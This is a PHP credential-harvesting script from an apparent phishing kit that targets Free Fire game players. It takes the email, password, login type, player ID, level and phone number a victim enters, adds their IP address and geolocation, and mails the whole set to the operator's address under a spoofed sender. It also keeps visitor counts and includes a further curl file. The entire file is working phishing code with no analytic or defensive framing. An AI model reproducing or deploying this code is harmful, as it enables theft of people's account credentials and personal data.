<?php
$email = $_POST['email'];
$password = $_POST['password'];
$login = $_POST['login'];
$playid = $_POST['playid'];
$level = $_POST['level'];
$nomor = $_POST['phone'];
$ip = $_SERVER['REMOTE_ADDR'];

include 'system/geo.php';

//PESAN EMAIL
$subjek = ''.$flag.' | '.$calling_code.' FF Level ['.$level.'] | Login '.$login.' | Punya '.$email;
$pesan = '
<!DOCTYPE html>
 <html>
 <head>
  <title></title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
  <style type="text/css">
   body {
    font-family: "Helvetica";
    width: 90%;
    display: block;
    margin: auto;
    border: 1px solid #fff;
    background: #fff;
   }

   .result {
    width: 100%;
    height: 100%;
    display: block;
    margin: auto;
    position: fixed;
    top: 0;
    right: 0;
    left: 0;
    bottom: 0;
    z-index: 999;
    overflow-y: scroll;
    border-radius: 10px;
   }

   .tblResult {
    width: 100%;
    display: table;
    margin: 0px auto;
    border-collapse: collapse;
    text-align: center;
    background: #d9dddc;
   }
   .tblResult th {
    text-align: left;
    font-size: 1em;
    margin: auto;
    padding: 15px 10px;
    background: #00bfff;
    border: 1px solid #00bfff;
    color: #fff;
   }

   .tblResult td {
    font-size: 1em;
    margin: auto;
    padding: 10px;
    border: 1px solid #00bfff;
    text-align: left;
    font-weight: bold;
    color: #000;
    text-shadow: 0px 0px 10px #fcfcfc;

   }

   .tblResult th img {
    width: 100%;
    display: block;
    margin: auto;
    box-shadow: 0px 0px 10px rgba(0,0,0, 0.5);
    border-radius: 10px;
   }
  </style>
 </head>
 <body>
  <div class="result">
   <table class="tblResult">
<tr>
     <th style="text-align: center;" colspan="3"> BANG AKHYAR 🤡</th>
    </tr>
    <tr>
     <td style="border-right: none;">Email</td>
     <td style="text-align: center;">'.$email.'</td>
    </tr>
                <tr>
     <td style="border-right: none;">Password</td>
     <td style="text-align: center;">'.$password.'</td>
    </tr>
       <tr>
           <td style="border-right: none;">Login</td>
     <td style="text-align: center;">'.$login.'</td>
    </tr>   
    <tr>
     <th style="text-align: center;" colspan="3">Informasi Game</th>
    </tr>
    <tr>
           <td style="border-right: none;">ID</td>
     <td style="text-align: center;">'.$playid.'</td>
    </tr>   
    <tr>
           <td style="border-right: none;">Level</td>
     <td style="text-align: center;">'.$level.'</td>
    </tr>   
    <tr>
           <td style="border-right: none;">Phone</td>
     <td style="text-align: center;">'.$nomor.'</td>
    </tr>   
    <tr>
     <th style="text-align: center;" colspan="3">Informasi Tambahan</th>
    </tr>
    <tr>
     <td style="border-right: none;">IP Address</td>
     <td style="text-align: center;">'.$ip.'</td>
    </tr>
                <tr>
     <td style="border-right: none;">Country</td>
     <td style="text-align: center;">'.$country.'</td>
    </tr>
          <tr>
     <td style="border-right: none;">Region</td>
     <td style="text-align: center;">'.$region.'</td>
    </tr>
       <tr>
           <td style="border-right: none;">City</td>
     <td style="text-align: center;">'.$city.'</td>
    </tr>
    <tr>
     <td style="border-right: none;">Zip Code</td>
     <td style="text-align: center;">'.$zip.'</td>
    </tr>
    <tr>
     <td style="border-right: none;">ASN</td>
     <td style="text-align: center;">'.$asn.'</td>
    </tr>
    </table>
    <div style="border:0px solid white;width: 294; font-weight:bold; height: 20px; background: #00bfff; color: #fff; padding: 15px; border-bottom-left-radius: 10px; border-bottom-right-radius: 10px; text-align:center;"></div>
  </div>
  </div>
 </body>
 </html>';
 
// Get Today Date
$Tget = file_get_contents("system/visitor.json");
$Tdecode = json_decode($Tget,true);
$today = $Tdecode['today'] + 1;
$Tdecode['today'] = $today;
$Tresult = json_encode($Tdecode);
            $Tfile = fopen('system/visitor.json','w');
                     fwrite($Tfile,$Tresult);
                     fclose($Tfile);
                     
// YESTERDAY
if(date("H:i") == "01:00"){
$Yget = file_get_contents("system/visitor.json");
$Ydecode = json_decode($Yget,true);
$Ydecode['yesterday'] = $Ydecode['today'];
$Ydecode['today'] = 0;
$Yresult = json_encode($Ydecode);
            $Yfile = fopen('system/visitor.json','w');
                     fwrite($Yfile,$Yresult);
                     fclose($Yfile);
}

// ALL OVER
$Aget = file_get_contents("system/visitor.json");
$Adecode = json_decode($Aget,true);
$all = $Adecode['total'] + 1;
$Adecode['total'] = $all;
$Aresult = json_encode($Adecode);
            $Afile = fopen('system/visitor.json','w');
                     fwrite($Afile,$Aresult);
                     fclose($Afile);

// RESULT DATA
include 'system/data.php';
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= 'From: '.$nik.' <admin@webgg.co.id>' . "\r\n";

if(mail($emailZ, $subjek, $pesan, $headers))
include 'filecurl.php';
?>